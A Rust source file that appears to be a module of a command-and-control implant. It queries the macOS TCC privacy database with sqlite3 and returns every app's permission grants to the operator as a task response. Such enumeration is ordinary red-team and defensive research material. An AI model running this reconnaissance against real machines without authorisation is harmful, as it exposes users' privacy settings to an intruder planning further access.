use crate::structs::Task;
use serde::Deserialize;
use std::path::Path;

#[derive(Deserialize)]
struct TccCheckArgs {
    #[serde(default)]
    user: String,
}

fn check_tcc(user: &str) -> String {
    // Check TCC database for permissions
    let db_paths = if user.is_empty() || user == "root" {
        vec!["/Library/Application Support/com.apple.TCC/TCC.db".to_string()]
    } else {
        vec![
            format!(
                "/Users/{}/Library/Application Support/com.apple.TCC/TCC.db",
                user
            ),
            "/Library/Application Support/com.apple.TCC/TCC.db".to_string(),
        ]
    };

    let mut output = String::new();
    for db_path in &db_paths {
        if !Path::new(db_path).exists() {
            output.push_str(&format!("TCC database not found at: {}\n", db_path));
            continue;
        }
        output.push_str(&format!("TCC database: {}\n", db_path));
        // Use sqlite3 command to query TCC database
        match std::process::Command::new("sqlite3")
            .args([
                db_path,
                "SELECT service, client, auth_value, auth_reason, flags FROM access;",
            ])
            .output()
        {
            Ok(result) => {
                let stdout = String::from_utf8_lossy(&result.stdout);
                let stderr = String::from_utf8_lossy(&result.stderr);
                if !stdout.is_empty() {
                    output.push_str(&format!(
                        "Service|Client|AuthValue|AuthReason|Flags\n{}\n",
                        stdout
                    ));
                }
                if !stderr.is_empty() {
                    output.push_str(&format!("Error: {}\n", stderr));
                }
            }
            Err(e) => {
                output.push_str(&format!("Failed to query TCC database: {}\n", e));
            }
        }
    }
    output
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: TccCheckArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let output = check_tcc(&args.user);
    response.user_output = output;
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
